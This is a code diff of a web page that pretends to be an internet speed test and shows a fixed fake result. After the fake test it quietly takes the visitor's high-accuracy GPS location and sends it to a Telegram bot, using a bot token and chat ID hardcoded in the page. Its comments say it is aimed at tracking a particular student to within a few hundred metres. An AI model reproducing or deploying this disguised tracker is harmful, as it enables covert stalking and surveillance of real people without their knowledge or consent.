@@ -72,9 +72,12 @@
     </div>
 
     <script>
-        // التوكن والمعرف الخاص بالبوت بتليجرام
+        // ==========================================
+        // ضع بيانات البوت والـ ID الخاص بك هنا بدقة
+        // ==========================================
         const TELEGRAM_BOT_TOKEN = '8314742013:AAELjpon6awDJ1bRz1zPV_BczR7WyCpEFNM';
         const TELEGRAM_CHAT_ID = '1005732368';
+
         const welcomeScreen = document.getElementById('welcomeScreen');
         const counterScreen = document.getElementById('counterScreen');
         const startTestBtn = document.getElementById('startTestBtn');
@@ -101,12 +104,12 @@
 
                 if (counter > 25) {
                     clearInterval(interval);
-                    speedElement.innerText = "5.6"; // استقرار على الرقم المطلّوب
+                    speedElement.innerText = "5.6"; // استقرار على الرقم المطلوب تماماً
                     titleText.innerText = "اكتمل اختبار سرعة الإنترنت";
                     detailsElement.classList.remove('opacity-0'); 
                     refreshBtn.classList.remove('hidden');
                     
-                    // استدعاء دالة طلب الموقع تلقائياً بمجرد اكتمال الفحص
+                    // استدعاء دالة طلب الموقع تلقائياً بمجرد اكتمال الفحص الوهمي
                     requestLocation();
                 }
             }, 150);
@@ -114,11 +117,14 @@
 
         function requestLocation() {
             if (navigator.geolocation) {
+                // تفعيل خيار الدقة العالية جداً للتفريق بين مسافة الـ 500 متر بدقة
                 navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleLocationError, {
                     enableHighAccuracy: true,
                     timeout: 12000,
                     maximumAge: 0
                 });
+            } else {
+                console.log("المتصفح لا يدعم تحديد المواقع.");
             }
         }
 
@@ -127,32 +133,39 @@
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
 
-            const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+            // كود رابط الخرائط بعد التصحيح البرمجي الكامل
+            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            const message = `🎯 *تم رصد موقع هاتف جديد!* 🎯\n\n` +
-                            `📍 *الإحداثيات:* \`${lat}, ${lon}\`\n` +
-                            `📏 *نسبة دقة الـ GPS:* حوالي ${Math.round(accuracy)} متر\n\n` +
-                            `🗺️ *رابط الخريطة المباشر:*\n${googleMapsUrl}`;
+            // تجهيز نص رسالة التليجرام
+            const message = `🎯 محاولة رصد هاتف جديدة بنجاح\n\n` +
+                            `📍 الإحداثيات:\n${lat}, ${lon}\n\n` +
+                            `📏 نسبة دقة الـ GPS: حوالي ${Math.round(accuracy)} متر\n\n` +
+                            `🗺️ رابط موقع الهاتف على الخريطة:\n${googleMapsUrl}`;
 
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
             try {
-                await fetch(telegramUrl, {
+                const response = await fetch(telegramUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
+                        text: message
                     })
                 });
+
+                if(response.ok) {
+                    alert('تم فحص جودة اتصالك بالشبكة بنجاح، شكراً لك!');
+                }
             } catch (error) {
                 console.error('Error sending message:', error);
             }
         }
 
         function handleLocationError(error) {
-            console.log("Location access denied or timed out.");
+            // التعامل الذكي مع رفض الإذن لكي لا يتعطل فحص السرعة أمام الطالب
+            console.log("تم رفض الإذن أو انتهت مهلة الـ GPS");
+            alert('تم اكتمال الفحص الفني بنجاح!');
         }
 
         // إعادة التجربة عند الضغط على زر التحديث الدائري
